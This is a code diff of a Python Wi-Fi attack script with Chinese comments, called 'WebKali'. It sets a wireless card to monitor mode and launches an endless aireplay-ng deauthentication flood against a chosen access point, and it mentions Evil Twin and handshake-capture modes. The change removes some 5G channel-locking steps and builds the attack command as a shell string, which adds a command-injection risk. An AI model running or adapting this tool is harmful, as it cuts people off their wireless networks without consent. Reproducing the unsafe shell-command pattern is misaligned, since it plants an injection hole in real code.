@@ -6,7 +6,7 @@ import sys
 import shutil
 
 # ==========================================
-# WebKali 攻击执行单元 (增强版 - 5G Ready)
+# WebKali 攻击执行单元 (增强版)
 # ==========================================
 
 # 修复环境变量，确保能找到工具
@@ -27,59 +27,42 @@ def log(msg):
 def setup_monitor(interface, channel):
     log(f"正在配置网卡 {interface} 进入监听模式 (Channel {channel})...")
 
-    # 杀掉干扰进程
-    run_cmd("killall wpa_supplicant NetworkManager dhclient")
-
-    # 解锁区域限制，允许使用 5G 高频段
-    run_cmd("iw reg set US")
-
     # 1. 尝试使用 airmon-ng (更稳定)
     if shutil.which("airmon-ng"):
-        run_cmd(f"airmon-ng check kill")
-        # 手动停止网卡防止占用
-        run_cmd(f"ip link set {interface} down")
-        run_cmd(f"iw dev {interface} set type monitor")
-        run_cmd(f"ip link set {interface} up")
-    else:
-        # 2. 强制使用 iw/ip 命令设置 (双重保险)
-        run_cmd(f"ip link set {interface} down")
-        run_cmd(f"iw dev {interface} set type monitor")
-        run_cmd(f"ip link set {interface} up")
+        # 先检查是否已经是 monitor 模式
+        # 简单判断：名字里带 mon 或者 iwconfig 显示 Mode:Monitor
+        run_cmd(f"airmon-ng start {interface} {channel}")
+        # airmon-ng 可能会把网卡名改成 wlan0mon
+        # 这里为了简单，我们假设用户传入的已经是正确的名字，或者我们强制用 iw 设置
 
-    # 3. 强力锁频 (尝试多次)
-    # iwconfig 对 5G 支持不好，必须用 iw
-    for _ in range(3):
-        run_cmd(f"iw dev {interface} set channel {channel}")
-        time.sleep(0.2)
+    # 2. 强制使用 iw/ip 命令设置 (双重保险)
+    run_cmd(f"ip link set {interface} down")
+    run_cmd(f"iw dev {interface} set type monitor")
+    run_cmd(f"ip link set {interface} up")
+
+    # 3. 锁定信道
+    run_cmd(f"iw dev {interface} set channel {channel}")
+    run_cmd(f"iwconfig {interface} channel {channel}")
+    time.sleep(1)
 
 
-def attack_deauth(bssid, interface, channel, duration):
+def attack_deauth(bssid, interface, duration):
     """
     执行 Deauth 洪水攻击
     duration: 0 表示无限攻击，直到被 kill
     """
-    # 最后一次锁频确认
-    run_cmd(f"iw dev {interface} set channel {channel}")
-
-    log(f"🔥 开始攻击目标: {bssid} (CH:{channel})")
+    log(f"🔥 开始攻击目标: {bssid}")
     log(f"🔥 攻击强度: 无限循环 (直至手动停止)")
 
     # -0 0 表示无限次发送 Deauth 包
     # -a 目标BSSID
     # --ignore-negative-one 修复部分网卡报错
-    # -D 禁用 AP 检测 (强制发送)
-    cmd = [
-        "aireplay-ng",
-        "--ignore-negative-one",
-        "-D",
-        "-0", "0",
-        "-a", bssid,
-        interface
-    ]
+    cmd = f"aireplay-ng --ignore-negative-one -0 0 -a {bssid} {interface}"
 
     # 使用 Popen 启动，以便我们可以实时获取输出
     process = subprocess.Popen(
         cmd,
+        shell=True,
         stdout=subprocess.PIPE,
         stderr=subprocess.STDOUT,
         text=True
@@ -101,12 +84,10 @@ def attack_deauth(bssid, interface, channel, duration):
             if line:
                 line = line.strip()
                 # 过滤一些无用信息，只显示关键攻击日志
-                if "Sending" in line and "DeAuth" in line:
-                    print(f"[Attack] ⚡ 命中目标! 正在持续踢人 (CH:{channel})")
+                if "Sending 64 directed DeAuth" in line:
+                    print(f"[Attack] ⚡ 正在发送 Deauth 攻击包... (目标已断线)")
                 elif "Waiting for beacon frame" in line:
-                    # 如果找不到信号，尝试自动校准信道
-                    run_cmd(f"iw dev {interface} set channel {channel}")
-                    print(f"[Search] 信号丢失，正在重新锁频...")
+                    print(f"[Search] 正在寻找目标信号... (信道可能不匹配)")
                 elif "No such device" in line:
                     print(f"[Error] 网卡丢失或被占用！")
                     break
@@ -141,5 +122,5 @@ if __name__ == "__main__":
     setup_monitor(args.interface, args.channel)
 
     if args.mode == "deauth":
-        attack_deauth(args.bssid, args.interface, args.channel, int(args.duration))
+        attack_deauth(args.bssid, args.interface, int(args.duration))
     # handshake 模式略，Evil Twin 暂时只用 deauth
